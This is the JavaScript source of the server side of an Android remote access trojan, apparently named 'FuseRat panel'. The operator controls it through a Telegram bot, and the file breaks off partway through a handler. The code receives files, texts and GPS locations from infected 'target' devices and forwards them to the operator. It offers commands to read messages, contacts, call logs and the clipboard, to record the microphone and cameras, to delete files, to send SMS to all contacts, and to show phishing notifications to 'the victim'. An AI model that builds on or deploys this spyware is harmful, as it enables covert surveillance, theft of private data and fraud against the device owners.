process.env.NTBA_FIX_350 = 1; 
process.env.NTBA_FIX_319 = 1; 

const express = require('express'),
  webSocket = require('ws'),
  http = require('http'),
  telegramBot = require('node-telegram-bot-api'),
  uuid4 = require('uuid'),
  multer = require('multer'),
  bodyParser = require('body-parser'),
  axios = require('axios')
require('dotenv').config()

const token = process.env.TOKEN,
  id = process.env.ID,
  address = 'https://www.google.com',
  app = express(),
  appServer = http.createServer(app),
  appSocket = new webSocket.Server({ server: appServer }),
  appBot = new telegramBot(token, { polling: true }),
  appClients = new Map()

// 🚀 EXTREME SERVER LIMITS (Prevents ANY Drop from Server Side)
appServer.keepAliveTimeout = 300000; // 5 Minutes
appServer.headersTimeout = 300000; 

const upload = multer({ limits: { fileSize: 500 * 1024 * 1024 } }); // 500MB Limit
app.use(bodyParser.json({ limit: '500mb' }));
app.use(bodyParser.urlencoded({ limit: '500mb', extended: true }));

let currentUuid = '',
  currentNumber = '',
  currentTitle = ''

app.get('/', function (req, res) {
  res.send('<h1 align="center">\uD835\uDE4E\uD835\uDE5A\uD835\uDE67\uD835\uDE6B\uD835\uDE5A\uD835\uDE67 \uD835\uDE6A\uD835\uDE65\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59\uD835\uDE5A\uD835\uDE59 \uD835\uDE68\uD835\uDE6A\uD835\uDE58\uD835\uDE58\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE5B\uD835\uDE6A\uD835\uDE61\uD835\uDE61\uD835\uDE6E</h1>')
})

// ⚡️ INSTANT UPLOAD ROUTE 
app.post('/uploadFile', (req, res) => {
  req.setTimeout(300000); 

  upload.single('file')(req, res, function (err) {
    if (err) {
      console.log('❌ [Upload Error]:', err.message);
      return res.status(500).send('Error');
    }

    if (!req.file) {
      console.log('⚠️ [Warning]: Android Hit Server but No File Received.');
      return res.status(200).send(''); 
    }

    const fileName = req.file.originalname || 'unknown_file';
    console.log(`📥 [Incoming File]: ${fileName} | Size: ${(req.file.size / 1024).toFixed(2)} KB`);

    // Let Android App know we got it instantly so it doesn't crash!
    res.status(200).send('');

    appBot.sendDocument(
      id,
      req.file.buffer,
      {
        caption: `°• 📁 <b>File Received</b>\n• Device: <b>${req.headers.model || 'Unknown Device'}</b>`,
        parse_mode: 'HTML',
      },
      {
        filename: fileName,
        contentType: req.file.mimetype || 'application/octet-stream',
      }
    ).then(() => {
        console.log(`✅ [Telegram Success]: Sent ${fileName} to chat.`);
    }).catch(apiErr => {
        console.log('❌ [Telegram API Error]:', apiErr.message);
    });
  });
});

app.post('/uploadText', (req, res) => {
  res.status(200).send(''); 
  appBot.sendMessage(
    id,
    `°• 📄 <b>Text Received</b>\n• Device: <b>${req.headers.model || 'Unknown'}</b>\n\n${req.body.text}`,
    { parse_mode: 'HTML' }
  ).catch(()=>{});
})

app.post('/uploadLocation', (req, res) => {
  res.status(200).send(''); 
  appBot.sendLocation(id, req.body.lat, req.body.lon).then(() => {
    appBot.sendMessage(
      id,
      `°• 📍 <b>Location Received</b>\n• Device: <b>${req.headers.model || 'Unknown'}</b>`,
      { parse_mode: 'HTML' }
    );
  }).catch(()=>{});
})

appSocket.on('connection', (socket, req) => {
  const userUuid = uuid4.v4();
  socket.uuid = userUuid;
  
  appClients.set(userUuid, {
    model: req.headers.model || 'Unknown',
    battery: req.headers.battery || 'Unknown',
    version: req.headers.version || 'Unknown',
    brightness: req.headers.brightness || 'Unknown',
    provider: req.headers.provider || 'Unknown',
  })
  
  appBot.sendMessage(
    id,
    '\xB0\u2022 🟢 <b>NEW DEVICE CONNECTED</b>\n\n' +
      `\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${req.headers.model || 'Unknown'}</b>\n` +
      `\u2022 ʙᴀᴛᴛᴇʀʏ : <b>${req.headers.battery || 'Unknown'}</b>\n` +
      `\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${req.headers.version || 'Unknown'}</b>\n` +
      `\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>${req.headers.provider || 'Unknown'}</b>`,
    { parse_mode: 'HTML' }
  )
  
  socket.on('close', function () {
    appBot.sendMessage(
      id,
      '\xB0\u2022 🔴 <b>DEVICE DISCONNECTED</b>\n\n' +
        `\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${req.headers.model || 'Unknown'}</b>\n`,
      { parse_mode: 'HTML' }
    )
    appClients.delete(socket.uuid)
  })
})

appBot.on('message', (msg) => {
  const chatId = msg.chat.id
  if (msg.reply_to_message) {
    const replyText = msg.reply_to_message.text;

    if (replyText.includes('\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E')) {
      currentNumber = msg.text;
      appBot.sendMessage(id, '°• 💬 Now enter the Message you want to send:', { reply_markup: { force_reply: true } });
    } 
    else if (replyText.includes('°• 💬 Now enter the Message')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('send_message:' + currentNumber + '/' + msg.text)
      });
      currentNumber = ''; currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('send_message_to_all:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('file:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('delete_file:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    // 🔥 LIVE COUNTDOWN LOGIC FOR MICROPHONE 🔥
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A')) {
      
      let duration = parseInt(msg.text);
      if (isNaN(duration) || duration <= 0) {
          appBot.sendMessage(id, '❌ Invalid Number! Enter a valid second.');
          return;
      }

      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('microphone:' + duration)
      });
      currentUuid = '';

      appBot.sendMessage(id, `🎙 <b>Microphone Active!</b>\n\n⏳ Recording Time Left: <b>${duration}s</b>`, {parse_mode: 'HTML'})
        .then((sentMsg) => {
            let timeLeft = duration;
            // Update message every 5 seconds to avoid Telegram Block
            let timerInterval = setInterval(() => {
                timeLeft -= 5;
                if(timeLeft <= 0) {
                    clearInterval(timerInterval);
                    appBot.editMessageText(`✅ <b>Recording Completed!</b>\n\n🔄 Uploading to server... Please wait.`, {
                        chat_id: id,
                        message_id: sentMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(()=>{});
                } else {
                    appBot.editMessageText(`🎙 <b>Microphone Active!</b>\n\n⏳ Recording Time Left: <b>${timeLeft}s</b>`, {
                        chat_id: id,
                        message_id: sentMsg.message_id,
                        parse_mode: 'HTML'
                    }).catch(()=>{});
                }
            }, 5000);
        });
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE61\uD835\uDE64\uD835\uDE63\uD835\uDE5C \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('rec_camera_main:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE68\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('rec_camera_selfie:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE5D\uD835\uDE56\uD835\uDE69 \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE64\uD835\uDE63 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE69\uD835\uDE56\uD835\uDE67\uD835\uDE5C\uD835\uDE5A\uD835\uDE69')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('toast:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE65\uD835\uDE65\uD835\uDE5A\uD835\uDE56\uD835\uDE67 \uD835\uDE56\uD835\uDE68 \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63')) {
      currentTitle = msg.text;
      appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60...\n\n\u2022 ᴡʜᴇɴ ᴛʜᴇ ᴠɪᴄᴛɪᴍ ᴄʟɪᴄᴋꜱ ᴏɴ ᴛʜᴇ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ, ᴛʜᴇ ʟɪɴᴋ ʏᴏᴜ ᴀʀᴇ ᴇɴᴛᴇʀɪɴɢ ᴡɪʟʟ ʙᴇ ᴏᴘᴇɴᴇᴅ', { reply_markup: { force_reply: true } });
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE42\uD835\uDE67\uD835\uDE5A\uD835\uDE56\uD835\uDE69, \uD835\uDE63\uD835\uDE64\uD835\uDE6C \uD835\uDE5A\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('show_notification:' + currentTitle + '/' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    } 
    else if (replyText.includes('\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64 \uD835\uDE61\uD835\uDE5E\uD835\uDE63\uD835\uDE60')) {
      appSocket.clients.forEach((client) => {
        if (client.uuid == currentUuid) client.send('play_audio:' + msg.text)
      });
      currentUuid = '';
      sendWaitMsg();
    }
  }
  
  if (id == chatId) {
    if (msg.text == '/start') {
      appBot.sendMessage(
        id,
        '\xB0\u2022 \xB0\u2022 \uD835\uDE52\uD835\uDE5A\uD835\uDE61\uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE5A \uD835\uDE69\uD835\uDE64  Fuse\uD835\uDE4D\uD835\uDE56\uD835\uDE69 \uD835\uDE65\uD835\uDE56\uD835\uDE63\uD835\uDE5A\uD835\uDE61\n\n\u2022 ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n\u2022 ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n\u2022 ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ',
        {
          parse_mode: 'HTML',
          reply_markup: {
            keyboard: [
              ['\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68'],
              ['\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59'],
            ],
            resize_keyboard: true,
          },
        }
      )
    }
    if (msg.text == '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68') {
      if (appClients.size == 0) {
        appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A\n\n\u2022 ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ')
      } else {
        let msgText = '\xB0\u2022 \uD835\uDE47\uD835\uDE5E\uD835\uDE68\uD835\uDE69 \uD835\uDE64\uD835\uDE5B \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5A\uD835\uDE59 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 :\n\n'
        appClients.forEach(function (c) {
          msgText += '\u2022 ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>' + c.model + '</b>\n' +
            ('\u2022 ʙᴀᴛᴛᴇʀʏ : <b>' + c.battery + '</b>\n') +
            ('\u2022 ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>' + c.version + '</b>\n') +
            ('\u2022 ꜱᴄʀᴇᴇɴ ʙʀɪɢʜᴛɴᴇꜱꜱ : <b>' + c.brightness + '</b>\n') +
            ('\u2022 ᴘʀᴏᴠɪᴅᴇʀ : <b>' + c.provider + '</b>\n\n')
        })
        appBot.sendMessage(id, msgText, { parse_mode: 'HTML' })
      }
    }
    if (msg.text == '\uD835\uDE40\uD835\uDE6D\uD835\uDE5A\uD835\uDE58\uD835\uDE6A\uD835\uDE69\uD835\uDE5A \uD835\uDE58\uD835\uDE64\uD835\uDE62\uD835\uDE62\uD835\uDE56\uD835\uDE63\uD835\uDE59') {
      if (appClients.size == 0) {
        appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE49\uD835\uDE64 \uD835\uDE58\uD835\uDE64\uD835\uDE63\uD835\uDE63\uD835\uDE5A\uD835\uDE58\uD835\uDE69\uD835\uDE5E\uD835\uDE63\uD835\uDE5C \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A\uD835\uDE68 \uD835\uDE56\uD835\uDE6B\uD835\uDE56\uD835\uDE5E\uD835\uDE61\uD835\uDE56\uD835\uDE57\uD835\uDE61\uD835\uDE5A')
      } else {
        const keyOptions = []
        appClients.forEach(function (c, cId) {
          keyOptions.push([{ text: c.model, callback_data: 'device:' + cId }])
        })
        appBot.sendMessage(
          id,
          '\xB0\u2022 \uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE58\uD835\uDE69 \uD835\uDE59\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A...',
          { reply_markup: { inline_keyboard: keyOptions } }
        )
      }
    }
  }
})

appBot.on('callback_query', (cbQuery) => {
  const msg = cbQuery.message,
    data = cbQuery.data,
    cmd = data.split(':')[0],
    uuid = data.split(':')[1]
  
  if (cmd == 'device') {
    appBot.editMessageText(
      '\xB0\u2022 <b>Selected Device:</b> ' + (appClients.get(uuid)?.model || 'Unknown'),
      {
        chat_id: id,
        message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: '\uD835\uDE3C\uD835\uDE65\uD835\uDE65\uD835\uDE68', callback_data: 'apps:' + uuid }, { text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE6B\uD835\uDE5E\uD835\uDE58\uD835\uDE5A \uD835\uDE5E\uD835\uDE63\uD835\uDE5B\uD835\uDE64', callback_data: 'device_info:' + uuid }],
            [{ text: '\uD835\uDE42\uD835\uDE5A\uD835\uDE69 \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A', callback_data: 'file:' + uuid }, { text: '\uD835\uDE3F\uD835\uDE5A\uD835\uDE61\uD835\uDE5A\uD835\uDE69\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A', callback_data: 'delete_file:' + uuid }],
            [{ text: '\uD835\uDE3E\uD835\uDE61\uD835\uDE5E\uD835\uDE65\uD835\uDE57\uD835\uDE64\uD835\uDE56\uD835\uDE67\uD835\uDE59', callback_data: 'clipboard:' + uuid }, { text: '\uD835\uDE48\uD835\uDE5E\uD835\uDE58\uD835\uDE67\uD835\uDE64\uD835\uDE65\uD835\uDE5D\uD835\uDE64\uD835\uDE63\uD835\uDE5A', callback_data: 'microphone:' + uuid }],
            [{ text: '\uD835\uDE48\uD835\uDE56\uD835\uDE5E\uD835\uDE63 \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56', callback_data: 'camera_main:' + uuid }, { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE61\uD835\uDE5B\uD835\uDE5E\uD835\uDE5A \uD835\uDE58\uD835\uDE56\uD835\uDE62\uD835\uDE5A\uD835\uDE67\uD835\uDE56', callback_data: 'camera_selfie:' + uuid }],
            [{ text: '\uD835\uDE47\uD835\uDE64\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', callback_data: 'location:' + uuid }, { text: '\uD835\uDE4F\uD835\uDE64\uD835\uDE56\uD835\uDE68\uD835\uDE69', callback_data: 'toast:' + uuid }],
            [{ text: '\uD835\uDE3E\uD835\uDE56\uD835\uDE61\uD835\uDE61\uD835\uDE68', callback_data: 'calls:' + uuid }, { text: '\uD835\uDE3E\uD835\uDE64\uD835\uDE63\uD835\uDE69\uD835\uDE56\uD835\uDE58\uD835\uDE69\uD835\uDE68', callback_data: 'contacts:' + uuid }],
            [{ text: '\uD835\uDE51\uD835\uDE5E\uD835\uDE57\uD835\uDE67\uD835\uDE56\uD835\uDE69\uD835\uDE5A', callback_data: 'vibrate:' + uuid }, { text: '\uD835\uDE4E\uD835\uDE5D\uD835\uDE64\uD835\uDE6C \uD835\uDE63\uD835\uDE64\uD835\uDE69\uD835\uDE5E\uD835\uDE5B\uD835\uDE5E\uD835\uDE58\uD835\uDE56\uD835\uDE69\uD835\uDE5E\uD835\uDE64\uD835\uDE63', callback_data: 'show_notification:' + uuid }],
            [{ text: '\uD835\uDE48\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A\uD835\uDE68', callback_data: 'messages:' + uuid }, { text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A', callback_data: 'send_message:' + uuid }],
            [{ text: '\uD835\uDE4B\uD835\uDE61\uD835\uDE56\uD835\uDE6E \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64', callback_data: 'play_audio:' + uuid }, { text: '\uD835\uDE4E\uD835\uDE69\uD835\uDE64\uD835\uDE65 \uD835\uDE56\uD835\uDE6A\uD835\uDE59\uD835\uDE5E\uD835\uDE64', callback_data: 'stop_audio:' + uuid }],
            [{ text: '\uD835\uDE4E\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61...', callback_data: 'send_message_to_all:' + uuid }],
          ],
        },
        parse_mode: 'HTML',
      }
    )
  }

  const quickCmds = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard', 'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
  if (quickCmds.includes(cmd)) {
    appSocket.clients.forEach(c => { if (c.uuid == uuid) c.send(cmd) })
    appBot.deleteMessage(id, msg.message_id)
    sendWaitMsg()
  }

  if (cmd == 'send_message') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE4B\uD835\uDE61\uD835\uDE5A\uD835\uDE56\uD835\uDE68\uD835\uDE5A \uD835\uDE67\uD835\uDE5A\uD835\uDE65\uD835\uDE61\uD835\uDE6E \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE63\uD835\uDE6A\uD835\uDE62\uD835\uDE57\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE64...', { reply_markup: { force_reply: true } })
    currentUuid = uuid
  }
  if (cmd == 'send_message_to_all') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE62\uD835\uDE5A\uD835\uDE68\uD835\uDE68\uD835\uDE56\uD835\uDE5C\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE68\uD835\uDE5A\uD835\uDE63\uD835\uDE59 \uD835\uDE69\uD835\uDE64 \uD835\uDE56\uD835\uDE61\uD835\uDE61', { reply_markup: { force_reply: true } })
    currentUuid = uuid
  }
  if (cmd == 'file') {
    appBot.deleteMessage(id, msg.message_id)
    appBot.sendMessage(id, '\xB0\u2022 \uD835\uDE40\uD835\uDE63\uD835\uDE69\uD835\uDE5A\uD835\uDE67 \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE65\uD835\uDE56\uD835\uDE69\uD835\uDE5D \uD835\uDE64\uD835\uDE5B \uD835\uDE69\uD835\uDE5D\uD835\uDE5A \uD835\uDE5B\uD835\uDE5E\uD835\uDE61\uD835\uDE5A \uD835\uDE6E\uD835\uDE64\uD835\uDE6A \uD835\uDE6C\uD835\uDE56\uD835\uDE63\uD835\uDE69 \uD835\uDE69\uD835\uDE64 \uD835\uDE59\uD835\uDE64\uD835\uDE6C\uD835\uDE63\uD835\uDE61\uD835\uDE64\uD835\uDE56\uD835\uDE59', { reply_markup: { force_reply: true }, parse_mode: 'HTML' })
    currentUuid = uuid
  }
  if (cmd == 'delete_file') {
    appBot.deleteMessage(id, msg.message_id)
